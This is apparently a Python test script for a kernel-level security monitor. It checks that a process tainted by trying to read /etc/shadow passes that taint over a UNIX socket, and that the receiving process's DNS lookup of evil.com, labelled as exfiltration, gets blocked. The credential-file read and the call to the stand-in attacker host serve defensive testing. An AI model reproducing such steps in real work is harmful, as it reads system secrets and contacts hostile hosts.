import socket
import os
import time
import threading

SOCK_PATH = "/tmp/sentinel_ipc.sock"

def server():
    if os.path.exists(SOCK_PATH):
        os.remove(SOCK_PATH)
    server_sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    server_sock.bind(SOCK_PATH)
    server_sock.listen(1)
    print("[SERVER] Listening on UNIX socket...")
    conn, _ = server_sock.accept()
    print("[SERVER] Accepted connection!")
    
    # Server reads from the socket. This triggers lsm/socket_recvmsg
    data = conn.recv(1024)
    print(f"[SERVER] Received: {data.decode()}")
    
    # Now the server should have inherited the taint!
    # Attempt DNS exfiltration to evil.com
    print("[SERVER] Attempting outbound exfiltration to evil.com...")
    try:
        socket.getaddrinfo('evil.com', 80)
        print("[SERVER] FATAL: Exfiltration succeeded! We should have been blocked!")
    except socket.gaierror as e:
        print(f"[SERVER] SUCCESS: DNS Blocked by XDP! {e}")

def client():
    time.sleep(1) # wait for server to start
    print("[CLIENT] Tainting self by attempting to read /etc/shadow...")
    try:
        # This will trigger lsm/file_open and taint the process
        with open("/etc/shadow", "r") as f:
            f.read()
    except PermissionError:
        pass 

    print("[CLIENT] Connecting to UNIX socket...")
    client_sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    client_sock.connect(SOCK_PATH) # Triggers lsm/unix_stream_connect
    
    print("[CLIENT] Sending payload...")
    client_sock.sendall(b"Hello from infected client!")
    client_sock.close()
    print("[CLIENT] Done.")

if __name__ == "__main__":
    t_server = threading.Thread(target=server)
    t_client = threading.Thread(target=client)
    t_server.start()
    t_client.start()
    t_server.join()
    t_client.join()
